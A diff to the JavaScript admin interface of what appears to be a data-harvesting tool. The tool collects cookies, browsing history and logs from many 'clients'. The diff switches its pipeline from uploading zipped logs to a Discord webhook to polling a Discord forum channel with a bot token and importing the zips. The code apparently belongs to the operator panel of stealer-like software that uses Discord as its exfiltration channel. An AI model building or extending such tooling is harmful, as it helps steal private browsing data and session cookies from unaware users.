@@ -75,14 +75,18 @@
   const purgeHistoryBtn   = $("purge-history-btn");
   const purgeCookiesBtn   = $("purge-cookies-btn");
   const discordUploadToggle = $("discord-upload-toggle");
-  const discordForumToggle  = $("discord-forum-toggle");
   const discordThreadPrefix = $("discord-thread-prefix");
+  const discordForumChannelId = $("discord-forum-channel-id");
+  const discordPollInterval = $("discord-poll-interval");
   const discordWebhookUrl   = $("discord-webhook-url");
+  const discordBotToken     = $("discord-bot-token");
   const discordWebhookShowBtn = $("discord-webhook-show-btn");
   const discordWebhookTestBtn = $("discord-webhook-test-btn");
+  const discordBotTestBtn   = $("discord-bot-test-btn");
+  const discordPollNowBtn   = $("discord-poll-now-btn");
   const discordWebhookSaveBtn = $("discord-webhook-save-btn");
-  const discordUploadBtn    = $("discord-upload-btn");
-  const discordUploadAllBtn = $("discord-upload-all-btn");
+  const discordPollBtn      = $("discord-poll-btn");
+  const discordPollStatusEl = $("discord-poll-status");
 
   const globalCard   = $("global-card");
   const clientsCard  = $("clients-card");
@@ -1632,6 +1636,20 @@
     setTimeout(() => { if (settingsStatus) settingsStatus.textContent = ""; }, 2500);
   }
 
+  function renderDiscordPollStatus(s) {
+    if (!discordPollStatusEl) return;
+    const st = s?.discord_poll_status || s;
+    if (!st || !st.lastAt) {
+      discordPollStatusEl.textContent = s?.discord_poll_ready
+        ? "Poller ready — waiting for first cycle"
+        : "Set bot token + forum channel id to enable import polling";
+      return;
+    }
+    const when = new Date(st.lastAt).toLocaleTimeString();
+    const ok = st.lastOk ? "ok" : "error";
+    discordPollStatusEl.textContent = `Last poll ${when} (${ok}): ${st.message || ""}${st.lastError ? " — " + st.lastError : ""}`;
+  }
+
   async function fetchCaptureSettings() {
     try {
       const s = await rpc("get_capture_settings");
@@ -1640,35 +1658,19 @@
       if (historyLimitInput) historyLimitInput.value = s.history_limit;
       if (cookieAgeInput) cookieAgeInput.value = s.cookie_max_age_days;
       if (discordUploadToggle) discordUploadToggle.checked = !!s.discord_upload_enabled;
-      if (discordForumToggle) discordForumToggle.checked = s.discord_forum_mode !== false;
       if (discordThreadPrefix) discordThreadPrefix.value = s.discord_thread_prefix || "Stuart";
-      if (discordWebhookUrl && s.discord_webhook_url !== undefined) {
-        // Don't overwrite if user is mid-edit with a longer secret than a masked value
-        if (!discordWebhookUrl.dataset.dirty) {
-          discordWebhookUrl.value = s.discord_webhook_url || "";
-        }
+      if (discordForumChannelId && !discordForumChannelId.dataset.dirty) {
+        discordForumChannelId.value = s.discord_forum_channel_id || "";
       }
-      updateDiscordUploadButtons();
+      if (discordPollInterval) discordPollInterval.value = s.discord_poll_interval_sec || 15;
+      if (discordWebhookUrl && s.discord_webhook_url !== undefined && !discordWebhookUrl.dataset.dirty) {
+        discordWebhookUrl.value = s.discord_webhook_url || "";
+      }
+      if (discordBotToken && s.discord_bot_token !== undefined && !discordBotToken.dataset.dirty) {
+        discordBotToken.value = s.discord_bot_token || "";
+      }
+      renderDiscordPollStatus(s);
     } catch (_) {}
-  }
-
-  function webhookLooksConfigured() {
-    const v = (discordWebhookUrl?.value || "").trim();
-    return /^https:\/\/(discord\.com|discordapp\.com)\/api\/webhooks\/\d+\//.test(v)
-      || (v.includes("webhooks") && v.length > 40);
-  }
-
-  function updateDiscordUploadButtons() {
-    const ready = webhookLooksConfigured() || !!discordUploadToggle?.checked;
-    // Manual send is always allowed for admin when data exists; server validates webhook
-    if (discordUploadBtn && !isGlobal) {
-      // enabled when client mode export is available
-      if (exportBtn) discordUploadBtn.disabled = exportBtn.disabled;
-    }
-    if (discordUploadAllBtn && isGlobal) {
-      discordUploadAllBtn.disabled = exportAllBtn ? exportAllBtn.disabled : true;
-    }
-    void ready;
   }
 
   let captureSettingsTimer = null;
@@ -1683,20 +1685,15 @@
           history_limit: Number(historyLimitInput?.value) || 0,
           cookie_max_age_days: Number(cookieAgeInput?.value) || 0,
           discord_upload_enabled: discordUploadToggle?.checked ?? false,
-          discord_forum_mode: discordForumToggle?.checked ?? true,
           discord_thread_prefix: discordThreadPrefix?.value?.trim() || "Stuart",
+          discord_forum_channel_id: discordForumChannelId?.value?.trim() || "",
+          discord_poll_interval_sec: Number(discordPollInterval?.value) || 15,
           ...(extra || {}),
         };
-        // Only push webhook URL when explicitly saving it (avoid wiping with masked value)
-        if (extra && Object.prototype.hasOwnProperty.call(extra, "discord_webhook_url")) {
-          body.discord_webhook_url = extra.discord_webhook_url;
-        }
         await rpc("update_capture_settings", body);
         if (settingsStatus) settingsStatus.textContent = "Saved";
-        if (extra && Object.prototype.hasOwnProperty.call(extra, "discord_webhook_url")) {
-          if (discordWebhookUrl) discordWebhookUrl.dataset.dirty = "";
-        }
-        updateDiscordUploadButtons();
+        const s = await rpc("get_capture_settings");
+        renderDiscordPollStatus(s);
       } catch (e) {
         if (settingsStatus) settingsStatus.textContent = `Error: ${e.message}`;
       }
@@ -1704,23 +1701,32 @@
     }, 600);
   }
 
-  async function saveDiscordWebhookNow() {
-    if (settingsStatus) settingsStatus.textContent = "Saving webhook…";
+  async function saveDiscordSettingsNow() {
+    if (settingsStatus) settingsStatus.textContent = "Saving Discord settings…";
     try {
       const url = (discordWebhookUrl?.value || "").trim();
-      await rpc("update_capture_settings", {
-        discord_webhook_url: url,
+      const token = (discordBotToken?.value || "").trim();
+      const body = {
         discord_upload_enabled: discordUploadToggle?.checked ?? false,
-        discord_forum_mode: discordForumToggle?.checked ?? true,
         discord_thread_prefix: discordThreadPrefix?.value?.trim() || "Stuart",
-      });
+        discord_forum_channel_id: discordForumChannelId?.value?.trim() || "",
+        discord_poll_interval_sec: Number(discordPollInterval?.value) || 15,
+      };
+      if (url && !url.includes("…") && !url.includes("****")) body.discord_webhook_url = url;
+      else if (!url) body.discord_webhook_url = "";
+      if (token && !token.includes("…") && !token.includes("****")) body.discord_bot_token = token;
+      else if (!token) body.discord_bot_token = "";
+      await rpc("update_capture_settings", body);
       if (discordWebhookUrl) discordWebhookUrl.dataset.dirty = "";
-      if (settingsStatus) settingsStatus.textContent = url ? "Webhook saved" : "Webhook cleared";
-      log(url ? "Discord webhook saved" : "Discord webhook cleared");
-      updateDiscordUploadButtons();
+      if (discordBotToken) discordBotToken.dataset.dirty = "";
+      if (discordForumChannelId) discordForumChannelId.dataset.dirty = "";
+      if (settingsStatus) settingsStatus.textContent = "Discord settings saved";
+      log("Discord pipeline settings saved");
+      const s = await rpc("get_capture_settings");
+      renderDiscordPollStatus(s);
     } catch (e) {
       if (settingsStatus) settingsStatus.textContent = `Error: ${e.message}`;
-      log(`Webhook save error: ${e.message}`);
+      log(`Discord settings error: ${e.message}`);
     }
     setTimeout(() => { if (settingsStatus) settingsStatus.textContent = ""; }, 3000);
   }
@@ -1729,25 +1735,16 @@
     if (settingsStatus) settingsStatus.textContent = "Testing webhook…";
     if (discordWebhookTestBtn) discordWebhookTestBtn.disabled = true;
     try {
-      // Save toggles first so server state matches UI for forum mode / prefix
-      await rpc("update_capture_settings", {
-        discord_upload_enabled: discordUploadToggle?.checked ?? false,
-        discord_forum_mode: discordForumToggle?.checked ?? true,
-        discord_thread_prefix: discordThreadPrefix?.value?.trim() || "Stuart",
-      });
       const url = (discordWebhookUrl?.value || "").trim();
-      const params = {
-        forumMode: discordForumToggle?.checked ?? true,
-      };
-      // Only pass URL if it looks like a full secret (not a masked display)
+      const params = {};
       if (url && !url.includes("…") && !url.includes("****")) params.url = url;
       const r = await rpc("test_discord_webhook", params);
       if (settingsStatus) settingsStatus.textContent = r.threadName
-        ? `Test OK — forum post "${r.threadName}"`
-        : "Test OK — message posted";
+        ? `Webhook OK — forum post "${r.threadName}"`
+        : "Webhook OK";
       log("Discord webhook test succeeded");
     } catch (e) {
-      if (settingsStatus) settingsStatus.textContent = `Test failed: ${e.message}`;
+      if (settingsStatus) settingsStatus.textContent = `Webhook test failed: ${e.message}`;
       log(`Discord webhook test failed: ${e.message}`);
     } finally {
       if (discordWebhookTestBtn) discordWebhookTestBtn.disabled = false;
@@ -1755,22 +1752,49 @@
     setTimeout(() => { if (settingsStatus) settingsStatus.textContent = ""; }, 5000);
   }
 
-  async function uploadToDiscord(clientIdOpt) {
-    const label = clientIdOpt ? shortId(clientIdOpt) : "all clients";
-    log(`Uploading ZIP to Discord (${label})…`);
+  async function testDiscordBot() {
+    if (settingsStatus) settingsStatus.textContent = "Testing bot…";
+    if (discordBotTestBtn) discordBotTestBtn.disabled = true;
     try {
-      const r = await rpc("upload_to_discord", clientIdOpt ? { clientId: clientIdOpt } : {});
-      if (r.skipped) {
-        log(`Discord upload skipped: ${r.reason || "n/a"}`);
-        return;
-      }
-      if (!r.ok) {
-        log(`Discord upload failed: ${r.error || "unknown"}`);
-        return;
-      }
-      log(`Discord upload OK: ${r.filename} (${r.size} bytes)${r.threadName ? ` thread=${r.threadName}` : ""}`);
+      const token = (discordBotToken?.value || "").trim();
+      const channelId = (discordForumChannelId?.value || "").trim();
+      const params = {};
+      if (token && !token.includes("…")) params.token = token;
+      if (channelId) params.channelId = channelId;
+      const r = await rpc("test_discord_bot", params);
+      if (settingsStatus) settingsStatus.textContent =
+        `Bot OK — @${r.bot?.username} sees #${r.channel?.name || r.channel?.id} (type ${r.channel?.type})`;
+      log(`Discord bot OK: ${r.bot?.username} / channel ${r.channel?.name}`);
     } catch (e) {
-      log(`Discord upload error: ${e.message}`);
+      if (settingsStatus) settingsStatus.textContent = `Bot test failed: ${e.message}`;
+      log(`Discord bot test failed: ${e.message}`);
+    } finally {
+      if (discordBotTestBtn) discordBotTestBtn.disabled = false;
+    }
+    setTimeout(() => { if (settingsStatus) settingsStatus.textContent = ""; }, 6000);
+  }
+
+  async function pollDiscordNow() {
+    log("Polling Discord forum for log zips…");
+    if (discordPollBtn) discordPollBtn.disabled = true;
+    if (discordPollNowBtn) discordPollNowBtn.disabled = true;
+    try {
+      const r = await rpc("poll_discord", {});
+      if (r.skipped) {
+        log(`Discord poll skipped: ${r.reason || "n/a"}`);
+      } else if (!r.ok) {
+        log(`Discord poll failed: ${r.error || "unknown"}`);
+      } else {
+        log(`Discord poll: threads=${r.threads} imported=${r.imported}${(r.errors && r.errors.length) ? " errors=" + r.errors.length : ""}`);
+        if (isGlobal) await loadGlobalStats().then(() => loadGlobalTab());
+      }
+      const s = await rpc("get_discord_poll_status");
+      renderDiscordPollStatus(s);
+    } catch (e) {
+      log(`Discord poll error: ${e.message}`);
+    } finally {
+      if (discordPollBtn) discordPollBtn.disabled = false;
+      if (discordPollNowBtn) discordPollNowBtn.disabled = false;
     }
   }
 
@@ -1791,14 +1815,17 @@
       if (purgeHistoryBtn) purgeHistoryBtn.disabled = true;
       if (purgeCookiesBtn) purgeCookiesBtn.disabled = true;
       if (discordUploadToggle) discordUploadToggle.disabled = true;
-      if (discordForumToggle) discordForumToggle.disabled = true;
       if (discordThreadPrefix) discordThreadPrefix.disabled = true;
+      if (discordForumChannelId) discordForumChannelId.disabled = true;
+      if (discordPollInterval) discordPollInterval.disabled = true;
       if (discordWebhookUrl) discordWebhookUrl.disabled = true;
+      if (discordBotToken) discordBotToken.disabled = true;
       if (discordWebhookShowBtn) discordWebhookShowBtn.disabled = true;
       if (discordWebhookTestBtn) discordWebhookTestBtn.disabled = true;
+      if (discordBotTestBtn) discordBotTestBtn.disabled = true;
+      if (discordPollNowBtn) discordPollNowBtn.disabled = true;
       if (discordWebhookSaveBtn) discordWebhookSaveBtn.disabled = true;
-      if (discordUploadBtn) discordUploadBtn.disabled = true;
-      if (discordUploadAllBtn) discordUploadAllBtn.disabled = true;
+      if (discordPollBtn) discordPollBtn.disabled = true;
       fetchAutoHarvestState();
       fetchCaptureSettings();
       return;
@@ -1812,21 +1839,28 @@
     if (historyLimitInput) historyLimitInput.addEventListener("change", saveCaptureSettings);
     if (cookieAgeInput) cookieAgeInput.addEventListener("change", saveCaptureSettings);
     if (discordUploadToggle) discordUploadToggle.addEventListener("change", () => saveCaptureSettings());
-    if (discordForumToggle) discordForumToggle.addEventListener("change", () => saveCaptureSettings());
     if (discordThreadPrefix) discordThreadPrefix.addEventListener("change", () => saveCaptureSettings());
-    if (discordWebhookUrl) {
-      discordWebhookUrl.addEventListener("input", () => {
-        discordWebhookUrl.dataset.dirty = "1";
-      });
+    if (discordPollInterval) discordPollInterval.addEventListener("change", () => saveCaptureSettings());
+    if (discordForumChannelId) {
+      discordForumChannelId.addEventListener("input", () => { discordForumChannelId.dataset.dirty = "1"; });
+      discordForumChannelId.addEventListener("change", () => saveCaptureSettings());
     }
-    if (discordWebhookSaveBtn) discordWebhookSaveBtn.addEventListener("click", saveDiscordWebhookNow);
+    if (discordWebhookUrl) {
+      discordWebhookUrl.addEventListener("input", () => { discordWebhookUrl.dataset.dirty = "1"; });
+    }
+    if (discordBotToken) {
+      discordBotToken.addEventListener("input", () => { discordBotToken.dataset.dirty = "1"; });
+    }
+    if (discordWebhookSaveBtn) discordWebhookSaveBtn.addEventListener("click", saveDiscordSettingsNow);
     if (discordWebhookTestBtn) discordWebhookTestBtn.addEventListener("click", testDiscordWebhook);
+    if (discordBotTestBtn) discordBotTestBtn.addEventListener("click", testDiscordBot);
+    if (discordPollNowBtn) discordPollNowBtn.addEventListener("click", pollDiscordNow);
     if (discordWebhookShowBtn) {
       discordWebhookShowBtn.addEventListener("click", () => {
-        if (!discordWebhookUrl) return;
-        const isPass = discordWebhookUrl.type === "password";
-        discordWebhookUrl.type = isPass ? "text" : "password";
-        discordWebhookShowBtn.textContent = isPass ? "Hide" : "Show";
+        const show = discordWebhookUrl?.type === "password";
+        if (discordWebhookUrl) discordWebhookUrl.type = show ? "text" : "password";
+        if (discordBotToken) discordBotToken.type = show ? "text" : "password";
+        discordWebhookShowBtn.textContent = show ? "Hide secrets" : "Show secrets";
       });
     }
 
@@ -1881,7 +1915,6 @@
       ].map(s => `<span class="gstat">${s}</span>`).join(sep);
 
       exportAllBtn.disabled = knownClients.length === 0;
-      if (discordUploadAllBtn) discordUploadAllBtn.disabled = knownClients.length === 0;
       loadSummary();
     } catch (e) { log(`Stats error: ${e.message}`); }
   }
@@ -2229,14 +2262,7 @@
       finally { exportAllBtn.disabled = knownClients.length === 0; }
     });
 
-    if (discordUploadAllBtn) {
-      discordUploadAllBtn.addEventListener("click", async () => {
-        if (!confirm("Zip all harvested logs and upload to the configured Discord webhook?")) return;
-        discordUploadAllBtn.disabled = true;
-        try { await uploadToDiscord(null); }
-        finally { discordUploadAllBtn.disabled = knownClients.length === 0; }
-      });
-    }
+    if (discordPollBtn) discordPollBtn.addEventListener("click", pollDiscordNow);
 
     clearAllBtn.addEventListener("click", async () => {
       if (!confirm("Delete ALL harvested data from ALL clients?\n\nThis cannot be undone.")) return;
@@ -2245,7 +2271,6 @@
         knownClients = []; tabData = {}; activeClient = "all";
         clientsCard.style.display = "none";
         exportAllBtn.disabled = true;
-        if (discordUploadAllBtn) discordUploadAllBtn.disabled = true;
         globalStats.innerHTML = `<span class="gstat"><strong>0</strong> clients</span>`;
         if (pagBar) pagBar.style.display = "none";
         buildCfilts(); buildTabs(); renderTable();
@@ -2266,7 +2291,6 @@
   function initClientMode() {
     clientIdEl.value = clientId;
     exportBtn.disabled = false;
-    if (discordUploadBtn) discordUploadBtn.disabled = false;
     globalCard.style.display = "none";
     clientsCard.style.display = "none";
     if (settingsCard) settingsCard.style.display = "none";
@@ -2334,15 +2358,6 @@
       } catch (err) { log(`Export error: ${err.message}`); }
       finally { exportBtn.disabled = false; }
     });
-
-    if (discordUploadBtn) {
-      discordUploadBtn.addEventListener("click", async () => {
-        if (!confirm("Zip this client's logs and upload to the configured Discord webhook?")) return;
-        discordUploadBtn.disabled = true;
-        try { await uploadToDiscord(clientId); }
-        finally { discordUploadBtn.disabled = false; }
-      });
-    }
 
     const eventDispatch = {
       ready(payload) {
